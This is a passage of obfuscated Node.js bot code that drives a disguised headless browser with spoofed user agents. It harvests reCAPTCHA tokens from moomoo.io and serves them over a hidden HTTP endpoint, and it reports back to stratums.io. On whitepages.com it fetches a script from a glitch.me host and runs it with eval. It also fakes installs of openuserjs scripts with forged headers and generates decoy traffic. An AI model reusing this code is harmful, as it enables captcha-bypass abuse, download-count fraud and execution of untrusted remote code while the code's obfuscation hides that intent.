      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + V(0x3) + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + U(0x9, 'E)ej') + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    V(0x11) + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x269f + 0xce7 * 0x3 + -0xc4 * 0x65
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = d,
      X = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require(X(0x15, 'fkLK')), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x14ae + -0x35 * -0xa6 + 0x1 * -0x370c)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k[Y(0xa)];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x4cf + 0x152c + -0xff9), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x23b4 + 0x44f + 0x4f * 0x67), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x3b2 * 0x9 + -0x10e1 + -0x1061;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x8c2 * 0x4 + -0x670 + 0x14 * -0x16e; w < getRandomInt(-0x1 * 0x13de + -0xdaf * -0x1 + 0x630, 0x2c3 + 0x6 * -0x45d + 0x1770); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xf55d + -0x49 * -0x41b + -0x2 * -0x5a05);
        }
      }();
    }, 0x11f * 0x12 + -0x1 * -0x1db + -0x15a5), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x103 * 0x3 + -0x37 * -0x96 + -0x1d31;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x19 * -0x86 + -0x2459 + -0x5 * -0x9e3, 0x23 * -0x91 + -0x2 * 0xa2b + 0x285b)), !z['includes']('isMoomooIo'))
          return await y[Z(0x1)](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1f4d + 0x296 * 0x3 + 0xb1 * 0x71);
    }, -0x1 * -0x5ee + -0x632 + -0x38 * -0x3), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x71 * -0x31 + -0x236d + 0xdcc;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1ef7 * -0x1 + 0x3 * 0x4a6 + -0x1 * -0x1cbd), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x24c5 + -0x1 * 0x20e1 + 0x45a6), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xf305f + -0x87029 * -0x1 + -0x9e4e8);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * -0x1a3d + 0x1 * -0x11a1 + -0x20e * 0x4);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xdd6 + 0x0 + 0xe9e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1c60 + -0x3fb * -0x5 + -0x185 * 0xb);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c;
  async function f() {
    const a0 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xb78 * -0x2 + -0x5 * -0x47f + -0x2d6a) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1941 + 0x1d * -0x11 + -0x1 * -0x1b2f));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x124b + -0x12c0 + 0x250b * 0x1, D['indexOf']('\x20'));
        return B ? E['slice'](0x2634 + -0x2 * 0xf67 + -0x1 * 0x766, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4543 + 0x61 * -0x9e + 0x1 * 0x1dab),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x[a0(0x4)])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x2993 + 0x19e2 + -0x1c65 * 0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + a1(0xf) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x39a + -0x59 * -0x10 + -0x92a; k < -0x1 * 0x215f + 0xb * -0xf5 + 0x1 * 0x2bea; k++)
    setTimeout(f, (0x59d * -0x5 + 0x9f45 + 0x7c * 0xd5) * k * getRandomInt(0x11f3 + -0x1 * 0x11f1 + 0x1 * -0x1, -0x7b * 0x4f + 0x9 * 0xc6 + 0x1f02));
  setInterval(() => {
    f();
    for (let l = -0x261b + -0x1 * 0x166d + 0x3c88; l < 0x2662 + 0x120d + 0x457 * -0xd; l++)
      setTimeout(f, (0x11d92 + -0x19950 + 0x17 * 0xf92) * l * getRandomInt(-0x24e1 + 0x1db5 + 0x1 * 0x72d, -0x145f + -0x487 + -0x18e9 * -0x1));
  }, 0x2ce * -0x1522 + -0x52215c + 0xc45538);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
